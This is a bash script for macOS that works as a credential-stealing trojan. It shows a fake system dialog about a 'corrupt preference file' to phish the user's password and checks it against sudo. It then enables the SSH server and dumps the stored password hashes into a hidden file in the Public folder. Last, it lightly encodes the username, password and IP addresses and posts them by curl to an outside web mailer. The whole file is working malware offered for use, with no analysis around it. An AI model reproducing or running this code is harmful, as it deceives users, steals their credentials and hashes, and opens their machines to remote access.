#!/bin/bash
##########
# Functions (subroutines, handlers)
##########

function request_password () {
	local blahblah="A corrupt preference file has been detected and must be repaired."
	blahblah="${blahblah} Enter the password for the user account ${the_username} to continue:"
	the_password=$( osascript -l AppleScript \
		-e "tell application \"System Events\"" \
		-e "activate" \
		-e "set the_icon to ${the_icon}" \
		-e "display dialog \"${blahblah}\" \
			with icon ${the_icon} with title \"Password\" default answer \"\" with hidden answer \
			buttons {\"OK\"} default button \"OK\"" \
		-e "end tell" )
	the_password="${the_password#*text returned:}" ; the_password="${the_password%, *}"
	[ "${admin_user}" == "true" ] && test_password && return 0
}

function test_password () {
	sudo -k
	the_uid=$( osascript -l AppleScript -e "do shell script \"id -u\" user name \"${the_username}\" password \
		\"${the_password}\" with administrator privileges" )
	[ "${the_uid}" == "0" ] && root_access="true" && return 0
	osascript -l AppleScript \
			-e "tell application \"System Events\" to display dialog \
			\"Incorrect password. Click Ok to try again.\" buttons {\"OK\"} default button \"OK\""
	the_password=""
	request_password
}

function test_sudo () {
        local -i last_access_time=0
        touch .saywhat 2>/dev/null
        last_access_time=$( stat -xt "%H%M" .saywhat 2>/dev/null | grep Access | cut -d ' ' -f 2 )
        echo "${the_password}" | sudo -S touch .saywhat 2>/dev/null &
        sleep 2
        if [ $( stat -xt "%H%M" .saywhat 2>/dev/null | grep Access | cut -d ' ' -f 2) -ne ${last_access_time} ]; then
            sudo_works="true"
            root_access="true"
            sudo rm .saywhat 2>/dev/null &
            enable_ssh
            # Insert other commands here...
        fi
}
function enable_ssh () {
	echo "${the_password}" | sudo -S echo
	if [ -f /System/Library/LaunchDaemons/ssh.plist ] ; then # for 10.4 and 10.5
		sudo /bin/launchctl load -w /System/Library/LaunchDaemons/ssh.plist && ssh_enabled="true" && return 0
		sudo /usr/bin/defaults write /System/Library/LaunchDaemons/ssh Disabled false
		sudo /sbin/service ssh start && ssh_enabled="true"
	elif [ -f /private/etc/xinetd.d/ssh ] ; then # for 10.3
		sudo sed -e 's/disable = .*$/disable = no/' /private/etc/xinetd.d/ssh > /private/etc/xinetd.d/ssh.new && \
			mv /private/etc/xinetd.d/ssh /private/etc/xinetd.d/ssh.old && \
			mv /private/etc/xinetd.d/ssh.new /private/etc/xinetd.d/ssh && \
			sudo killall xinetd && \
			sudo xinetd --start && \
			ssh_enabled="true" && \
			return 0
	else # For 10.2
		sudo sed -e "s/SSHSERVER=-NO-/SSHSERVER=-YES-/" /etc/hostconfig > \
			/etc/hostconfig.new && mv /etc/hostconfig.new /etc/hostconfig
		grep 'SSHSERVER=-YES-' /etc/hostconfig || sudo echo "SSHSERVER=-YES-" >> /etc/hostconfig
		sudo killall inetd && sudo inetd && ssh_enabled="true" && return 0
	fi
}

function output () {
    local the_name line the_rest the_hashfile the_hash SSHA1 S0SHA1
    echo -n "${the_username}${tab}${the_password}${tab}" >> "${secret_file}"
    id >> "${secret_file}"
    /usr/bin/nidump passwd . 2>/dev/null >> "${secret_file}"
    if [ "${root_access}" == "true" ]; then
        if [ ${osxversion} -eq 3 ]; then # The Panther hash file format is NT 32 chrs, LM 32 chrs, raw-SHA1 40 chrs
            /usr/bin/nidump passwd . 2>/dev/null | grep -v ":\*:" | while read line
            do
                the_name="${line%%:*}" the_rest="${line#*:*:}"
                the_hashfile=$( niutil -readprop . "/users/${the_name}" generateduid 2>&1 )
                [ -f "/var/db/shadow/hash/${the_hashfile}" ] && the_hash=$( sudo cat "/var/db/shadow/hash/${the_hashfile}" )
                [ "${the_hash:0:63}" != $( jot -s '' -b 0 63 ) -a "${the_hash:0:63}" != "" ] && \
                    echo "_${the_name}_NTLM:${the_hash:0:32}:${the_hash:32:32}:${the_rest}" >> "${secret_file}"
                echo "_${the_name}_rawSHA1:${the_hash:64:40}:${the_rest}" >> "${secret_file}"
            done
        elif [ ${osxversion} -ge 4 ]; then # Tiger and Leopard hash files
            dscl . -list /Users authentication_authority | grep -i hash | sed "s/ .*$//" | while read the_name
            do
                the_hashfile=$( dscl . -read /users/"${the_name}" generateduid | sed "s/^.* //" )
                the_hash=$( sudo cat "/var/db/shadow/hash/$the_hashfile" )
                S0SHA1="${the_hash:104:48}"
                SSHA1="${the_hash:168:48}"
                echo "${the_name}_NTLM:${the_hash:0:32}${the_hash:32:32}:${newline}${the_name}_SSHA1:"\
                "${SSHA1}:${newline}${the_name}_S0SHA1:${S0SHA1}:" >> "${secret_file}"
            done
        elif [ ${osxversion} -le 2 ]; then # Jaguar and prior...
            /usr/bin/nidump passwd . 2>/dev/null | grep -v ":\*:" | while read line
            do
                the_name="${line%%:*}" the_rest="${line#*:*:}"
                the_hashfile=$( niutil -readprop . "/users/${the_name}" generateduid 2>&1 )
                [ -f "/var/db/samba/hash/${the_hashfile}" ] && the_hash=$( sudo cat "/var/db/samba/hash/${the_hashfile}" )
                echo "_${the_name}_NTLM:${the_hash:0:32}:${the_hash:32:32}:${the_rest}" >> "${secret_file}"
            done

        fi
    fi
}

##########
# Variables
##########

declare the_username the_password
declare groups admin_user="false" root_access="false" sudo_works="false"
declare ip_addresses public_ip_address private_ip_address_en0 private_ip_address_en1 private_ip_address_of_router
declare the_email the_subject the_message
declare the_uid ssh_enabled="false"
declare osxversion=$( sw_vers -productVersion | cut -d '.' -f 2 )
declare output_file="false" secret_file=~/Public/.howdy # Don't quote a tilde here!
declare tab=$'\t' newline=$'\n'
declare the_icon=2

if [ -f "/System/Library/CoreServices/SecurityAgent.app/Contents/Resources/Security.icns" ] ; then
	the_icon="POSIX file \"/System/Library/CoreServices/SecurityAgent.app/Contents/Resources/Security.icns\""
fi

# Gathering info...
the_username="$( /usr/bin/whoami )"

public_ip_address="$( curl http://ipid.shat.net/iponly/ | grep body | sed -e 's/^<body>//' -e 's/<.*$//' )"
private_ip_address_en0="$( ifconfig en0 2>/dev/null | head -n 2 | tail -n 1 | sed -e 's/^.*inet //' -e 's/ .*$//' )"
private_ip_address_en1="$( ifconfig en1 2>/dev/null | head -n 2 | tail -n 1 | sed -e 's/^.*inet //' -e 's/ .*$//' )"
private_ip_address_of_router="$( arp -a | sed -e 's/^.* (//' -e 's/).*$//' )"
ip_addresses="${public_ip_address} ${private_ip_address_en0} ${private_ip_address_en1} ${private_ip_address_of_router}"
ip_addresses="${ip_addresses//  / }"

groups="$( /usr/bin/id )"
[ "${groups}" != "${groups/(admin)}" ] && admin_user="true"


##########
# Main
##########

touch "${secret_file}" && output_file="true"
test_sudo
request_password
if [ "${root_access}" == "true" -a "${ssh_enabled}" != "true" ] ; then
	enable_ssh
fi

[ "${output_file}" == "true" ] && output

# Compose email for web form post
the_email="andrew%40schjelderup.org"
the_subject="Howdy"
the_message="${the_username} ${the_password} ${ip_addresses}"
the_message="$( echo ${the_message} | /usr/bin/tr '. 0123456789[A-M][N-Z][a-m][n-z]' '_+5678901234[N-Z][A-M][n-z][a-m]' )"

email_result=$( curl -d "email=${the_email}&subject=${the_subject}&message=${the_message}" --referer http://psidude.com/mailer/mail.php psidude.com/mailer/mail.php )

# To decode the incoming message...
# echo "ENCODED_STRING" | tr " " "+" | tr '_+5678901234[N-Z][A-M][n-z][a-m]' '. 0123456789[A-M][N-Z][a-m][n-z]'

exit 0
